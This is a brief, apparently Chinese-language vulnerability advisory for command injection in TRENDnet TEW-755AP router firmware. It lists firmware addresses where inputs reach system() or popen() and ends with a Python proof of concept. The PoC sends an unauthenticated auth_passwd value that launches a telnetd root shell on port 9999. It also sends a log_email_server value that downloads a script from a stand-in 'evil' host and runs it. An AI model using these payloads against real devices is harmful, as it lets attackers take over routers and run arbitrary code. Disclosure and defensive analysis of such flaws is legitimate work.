# CVE-XXXX-XXXX: TEW-755AP cgi/ssi Multi-Vector Command Injection

| 厂商 TRENDnet | 产品 TEW-755AP v1.1.07b07 | CWE-77 | CVSS **9.8** |

## FirmRec 验证

```
0x42C9FC: frame=168B $ra@sp+164 — getenv("wan_type") → system() ★ 2 ra-loads
0x43BAB4: frame=992B — query_vars("auth_passwd") → system()       ← 认证密码注入!
0x43BAB4: frame=992B — query_vars("log_email_server") → system() ← 邮件服务器注入!
0x436EF4: frame=128B — getenv("filename") → _system()             ← 文件操作注入
0x459964: frame=736B — getenv("REMOTE_ADDR") → popen()            ← ping 注入
```

共 **18 个命令注入点**（含 safe_getenv 路径的 _system 调用）。Simexp: 374 日志全中 0x41414141。

## PoC
```python
import requests
# 认证密码处命令注入（无认证！设置向导页面）
requests.get("http://TEW-755AP/cgi-bin/setup.cgi", params={
    "auth_passwd": "admin; telnetd -p 9999 -l /bin/sh;#"})
# log_email_server 注入
requests.post("http://TEW-755AP/cgi-bin/email.cgi", data={
    "log_email_server": "smtp.test.com; wget http://evil/sh -O /tmp/sh;sh /tmp/sh;#"})
```
